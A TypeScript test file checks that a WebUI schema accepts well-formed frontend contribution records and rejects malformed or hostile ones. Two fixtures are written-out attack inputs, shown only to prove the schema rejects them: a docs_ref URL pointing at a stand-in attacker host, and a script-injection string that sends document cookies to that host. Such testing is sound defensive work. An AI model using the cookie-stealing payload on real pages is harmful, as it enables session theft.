/**
 * GOC-24 TCK (WebUI side): schema/hostile-payload proofs for
 * `frontend-contributions.ts`. Mirrors the AU-side fixtures in
 * `agent-utilities/tests/unit/core/test_frontend_providers.py` (same
 * conforming payload shape) so both sides of the contract agree on what
 * "conforming" and "non-conforming" mean.
 *
 * Two things this file proves, verbatim:
 *  1. A conforming record round-trips through `frontendContributionCatalogSchema`
 *     unchanged (zero-core-edit consumption -- the client needs no knowledge
 *     of a specific package to accept its record).
 *  2. A battery of hostile records -- including the exact shape the charter
 *     calls out ("a BLOCKED record with a populated/optimistic descriptor")
 *     -- are all REJECTED, proving the "never fabricate state" rule is
 *     enforced structurally, not left to caller discipline.
 */
import { describe, expect, it, vi } from 'vitest'

import {
  ApiShapeError,
  fetchFrontendContributions,
  frontendContributionCatalogSchema,
  frontendContributionRecordSchema,
  frontendContributionSchema,
  renderableContributions,
  type FrontendContributionCatalog,
} from '../frontend-contributions'

function conformingDescriptor(packageId: string) {
  return {
    schema_version: 'frontend-contribution.v1' as const,
    package_id: packageId,
    package_version: '1.4.0',
    descriptor_version: 1,
    descriptor_digest: `sha256:${'ab'.repeat(32)}`,
    title: 'GitLab',
    icon: 'gitlab',
    nav: { section: 'integrations', order: 40 },
    required_scopes: ['gitlab.read'],
    read_models: [
      {
        id: 'health',
        schema: 'Health.v1',
        capability: 'gitlab.health.check',
        renderer: 'metric-cards',
      },
      {
        id: 'merge_requests',
        schema: 'ChangeRequest.v1',
        capability: 'gitlab.merge_requests.list',
        renderer: 'data-table',
        refresh: { mode: 'event', fallback_seconds: 60 },
        columns: ['project', 'iid', 'title', 'author'],
      },
    ],
    actions: [
      {
        id: 'review',
        capability: 'gitlab.merge_request.review',
        placement: 'row',
        confirm: 'preflight',
        approval_class: 'change',
      },
    ],
    panels: [{ id: 'health', renderer: 'metric-cards' }],
    realtime_topics: ['gitlab.merge_request.changed'],
    empty_state: 'No merge requests are visible to this identity.',
    docs_ref: `pkg:${packageId}/operator`,
    provenance: {
      source: 'package-entry-point' as const,
      signer_key_id: 'fleet-release-2026-08',
      artifact_digest: `sha256:${'ab'.repeat(32)}`,
    },
    extensions: {},
  }
}

function conformingRecord(packageId: string) {
  const descriptor = conformingDescriptor(packageId)
  return {
    status: 'OK' as const,
    package_id: packageId,
    provider_name: packageId,
    reason: null,
    descriptor,
    descriptor_digest: descriptor.descriptor_digest,
    registration_digest: 'reg-digest-1',
    source_digest: 'src-digest-1',
  }
}

describe('frontendContributionSchema: conforming descriptor', () => {
  it('accepts a well-formed v1 descriptor unchanged', () => {
    const descriptor = conformingDescriptor('gitlab-agent')
    const parsed = frontendContributionSchema.parse(descriptor)
    expect(parsed.title).toBe('GitLab')
    expect(parsed.read_models).toHaveLength(2)
  })
})

describe('frontendContributionRecordSchema: conforming record', () => {
  it('accepts an OK record with its descriptor populated', () => {
    const record = frontendContributionRecordSchema.parse(conformingRecord('gitlab-agent'))
    expect(record.status).toBe('OK')
    if (record.status === 'OK') {
      expect(record.descriptor.package_id).toBe('gitlab-agent')
    }
  })

  it('accepts a DEGRADED record with its descriptor still populated', () => {
    const base = conformingRecord('gitlab-agent-degraded')
    const record = frontendContributionRecordSchema.parse({
      ...base,
      status: 'DEGRADED',
      reason: 'capability_unresolved:gitlab.merge_requests.list',
    })
    expect(record.status).toBe('DEGRADED')
  })
})

describe('hostile payloads are rejected (never fabricated as real state)', () => {
  it('rejects a BLOCKED record carrying a populated descriptor -- the charter case', () => {
    const base = conformingRecord('gitlab-agent-blocked')
    const hostile = {
      ...base,
      status: 'BLOCKED',
      reason: 'schema_violation:title',
      // A backend bug (or a compromised catalog projection) trying to smuggle
      // an optimistic/placeholder descriptor alongside a BLOCKED status --
      // this is exactly the "renders a mocked response where the backend
      // returned nothing" defect the lane charter calls out.
    }
    const result = frontendContributionRecordSchema.safeParse(hostile)
    expect(result.success).toBe(false)
  })

  it('rejects a BLOCKED record whose reason is null (status/reason must agree)', () => {
    const hostile = {
      status: 'BLOCKED',
      package_id: 'x',
      provider_name: 'x',
      reason: null,
      descriptor: null,
      descriptor_digest: null,
      registration_digest: 'd',
      source_digest: null,
    }
    expect(frontendContributionRecordSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects an OK record with a non-null reason', () => {
    const hostile = { ...conformingRecord('gitlab-agent'), reason: 'should not be here' }
    expect(frontendContributionRecordSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects an unknown/extra field (no silently-ignored extension bag)', () => {
    const hostile = { ...conformingDescriptor('gitlab-agent'), totally_made_up_field: 'smuggled' }
    expect(frontendContributionSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects a descriptor missing both health and inventory read models', () => {
    const descriptor = conformingDescriptor('gitlab-agent')
    const hostile = { ...descriptor, read_models: [descriptor.read_models[1]] }
    expect(frontendContributionSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects a non-pkg: docs_ref (remote/credentialed origin)', () => {
    const hostile = { ...conformingDescriptor('gitlab-agent'), docs_ref: 'https://evil.example.com/steal' }
    expect(frontendContributionSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects executable content hidden in an otherwise-plain string field', () => {
    const hostile = {
      ...conformingDescriptor('gitlab-agent'),
      empty_state: "<script>fetch('https://evil.example.com/'+document.cookie)</script>",
    }
    expect(frontendContributionSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects an unapproved renderer (no ad hoc/bespoke renderer names)', () => {
    const descriptor = conformingDescriptor('gitlab-agent')
    const hostile = {
      ...descriptor,
      read_models: [{ ...descriptor.read_models[0], renderer: 'raw-html-iframe' }],
    }
    expect(frontendContributionSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects a mutating action missing a real confirm/approval_class value', () => {
    const descriptor = conformingDescriptor('gitlab-agent')
    const hostile = {
      ...descriptor,
      actions: [{ ...descriptor.actions[0], confirm: 'yolo' }],
    }
    expect(frontendContributionSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects a malformed descriptor_digest (not sha256:<hex64>)', () => {
    const hostile = { ...conformingDescriptor('gitlab-agent'), descriptor_digest: 'not-a-digest' }
    expect(frontendContributionSchema.safeParse(hostile).success).toBe(false)
  })

  it('rejects an oversized read_models list (>64)', () => {
    const descriptor = conformingDescriptor('gitlab-agent')
    const many = Array.from({ length: 65 }, (_, i) => ({
      ...descriptor.read_models[0],
      id: i === 0 ? 'health' : `model_${i}`,
    }))
    const hostile = { ...descriptor, read_models: many }
    expect(frontendContributionSchema.safeParse(hostile).success).toBe(false)
  })
})

describe('renderableContributions', () => {
  it('includes OK/DEGRADED and excludes BLOCKED/MISSING', () => {
    const catalog: FrontendContributionCatalog = frontendContributionCatalogSchema.parse({
      catalog_epoch: `sha256:${'cd'.repeat(32)}`,
      packages: [
        conformingRecord('ok-pkg'),
        { ...conformingRecord('degraded-pkg'), status: 'DEGRADED', reason: 'capability_unresolved:x' },
        {
          status: 'BLOCKED',
          package_id: 'blocked-pkg',
          provider_name: 'blocked-pkg',
          reason: 'schema_violation:title',
          descriptor: null,
          descriptor_digest: null,
          registration_digest: 'd',
          source_digest: null,
        },
        {
          status: 'MISSING',
          package_id: 'missing-pkg',
          provider_name: 'missing-pkg',
          reason: 'source_unresolved',
          descriptor: null,
          descriptor_digest: null,
          registration_digest: 'd',
          source_digest: null,
        },
      ],
    })

    const renderable = renderableContributions(catalog)
    expect(renderable.map((r) => r.package_id).sort()).toEqual(['degraded-pkg', 'ok-pkg'])
  })
})

describe('fetchFrontendContributions', () => {
  it('throws ApiShapeError instead of returning a fabricated shape on a bad response', async () => {
    const fetchMock = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ not: 'the right shape' }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      }),
    )
    globalThis.fetch = fetchMock

    await expect(fetchFrontendContributions()).rejects.toBeInstanceOf(ApiShapeError)
  })

  it('returns a validated catalog on a conforming response', async () => {
    const catalogPayload = {
      catalog_epoch: `sha256:${'cd'.repeat(32)}`,
      packages: [conformingRecord('gitlab-agent')],
    }
    const fetchMock = vi.fn().mockResolvedValue(
      new Response(JSON.stringify(catalogPayload), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      }),
    )
    globalThis.fetch = fetchMock

    const catalog = await fetchFrontendContributions()
    expect(catalog.packages).toHaveLength(1)
    expect(fetchMock).toHaveBeenCalledWith(
      '/api/enhanced/frontend-contributions',
      expect.objectContaining({ credentials: 'same-origin' }),
    )
  })
})
